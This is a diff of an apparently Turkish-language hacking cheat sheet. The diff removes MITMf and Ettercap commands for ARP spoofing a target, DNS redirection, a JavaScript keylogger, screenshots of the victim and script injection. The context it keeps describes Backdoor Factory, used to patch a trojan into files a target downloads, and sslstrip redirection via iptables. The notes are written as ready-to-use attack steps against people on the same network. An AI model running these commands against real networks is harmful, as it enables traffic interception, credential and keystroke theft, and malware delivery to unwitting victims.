@@ -21,30 +21,6 @@
     \*\*Siteden girilen ip adresi değişti. Komut satırında ise hala eski ip mevcut. Onunda değişmesi için;  
     “proxychains curl icanhazip.com”    => Yazacağın her komutun başına proxychains yaz, ip gizlenir.
 
-### MITM (Man in the Middle Framework)  
-    Yüklemek için     ->    “apt-get install mitmf”  
-    “mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0”  
-    Güvenli Https isteklerini Http olarak açtırır. Hsts kullanan sitelerde çalışmaz. (Hsts: Adres satırına elle http girsen bile seni https sayfasına atar. Facebook ve gmail hsts kullanıyor)  
-
-### MITM DNS  
-    Sahte Dns adreslerine yönlendirme yapar.İstediğimiz ip adresine yönlendiririz.  
-    “leafpad /etc/mitmfmitmf.conf” -> Açılan dosyada \[\[\[A\]\]\] yazan yer girilen sitenin yönlendirildiği ip nin yazıldığı yer. (\*.hotmail.com = 192.168.1.1)  
-
-    Yönlendirmeyi başlatma :  
-    “mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --dns”
-
-    Ekran Görüntüsü Alma:  
-    “mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --screen --interval 20” (20 saniye)  
-    Görüntülerin kaydedildiği yer : /var/log/mitmf  
-    Hata verirse : “pip install Twisted=15.5.0”  
-
-    Klavye Tuşlarını Takip Etmek:  
-    “mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --jskeylogger”  
-
-    Java Script Kodlarını Çalıştırmak:  
-    “mitmf --arp --spoof --gateway modem\_ip --target hedef\_ip -i eth0 --inject --js-payload “alert(‘...’);”
-
-
 ### BDF (Backdoor Factory) Proxy
     Hedef birşey indirmek istediğinde biz trojanımızı o dosyanın içine yamalıyoruz. Bunun için;  
     1-    Aynı ağda olmak  
@@ -64,12 +40,6 @@
     “ip tables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000”
 
     “sslstrip”  
-
-### Ettercap çalıştırma:  
-    “ettercap -Tq -M arp:remote -S -i wlan0 /192.168.1.1//  /192.168.1.15//”  
-    // -S -> sslstrip kendimiz yaptığımız için S koymalıyız.  
-    Virüslü Dosyayı Görsel Dosya İle Birleştirme:
-
   
 ### BIND SHELL , REVERSE SHELL
 
